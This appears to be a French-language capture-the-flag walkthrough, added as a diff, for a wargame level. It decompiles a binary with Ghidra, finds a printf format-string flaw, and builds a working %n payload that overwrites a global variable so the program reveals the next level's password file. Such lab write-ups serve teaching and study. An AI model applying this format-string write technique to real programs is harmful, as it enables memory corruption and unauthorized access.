@@ -1,0 +1,50 @@
+1. ls -la
+   -> level4
+
+2. ./level4
+   test
+   -> test + fin programme
+
+3. Ghidra : Import /tmp/level2
+   Decompile de main() :
+   -> main() call n()
+
+4. Ghidra : Decompile de n()
+   void n(void) {
+     char local_20c [520];
+     fgets(local_20c,0x200,stdin);
+     p(local_20c);
+     if (m == 0x1025544) { # jamais modifiée dans la fct
+       system("/bin/cat /home/user/level5/.pass");
+     }
+   }
+
+5. Ghidra : Decompile de p()
+   void p(char *param_1) {
+     printf(param_1); # printf appelé directement avec input comme format -> faille
+   }
+
+Doc faille format string : https://owasp.org/www-community/attacks/Format_string_attack
+Write data on an adress with printf : https://www.geeksforgeeks.org/c/g-fact-31/
+
+6. Localisation de la variable globale m dans Ghidra :
+   Symbol Tree -> Labels -> adresse trouvée pour m : 0x08049810
+
+7. Test de la faille format string :
+   ./level4
+   AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+   -> AAAA1246b0.bffff774.2dfff4.0.0.bffff738.804848d.bffff530.200.2e0ac0.1257d0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78
+   -> "41414141" (= "AAAA" en hexa) apparaît à la 12e position (Notre input est au 12ème arg lu par printf)
+
+8. Conversion de la cible 0x1025544 en décimal :
+   python3 -c "print(0x1025544)" -> 16930116
+
+9. payload :
+   - adresse de m (4 bytes, little-endian) : \x10\x98\x04\x08
+   - %16930112d -> force printf à "compter" jusqu'à 16930116 caractères (16930116 - 4, les 4 bytes de l'adresse comptant déjà comme caractères affichés)
+   - %12$n -> écrit ce compteur directement à l'adresse située au 12e argument (celle qu'on a placé donc m)
+   python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit4
+
+10. cat /tmp/exploit4 | ./level4
+    -> printf affiche padding + écrit valeur compteur à l'adresse de m -> n() condition vraie
+    -> system("/bin/cat /home/user/level5/.pass")
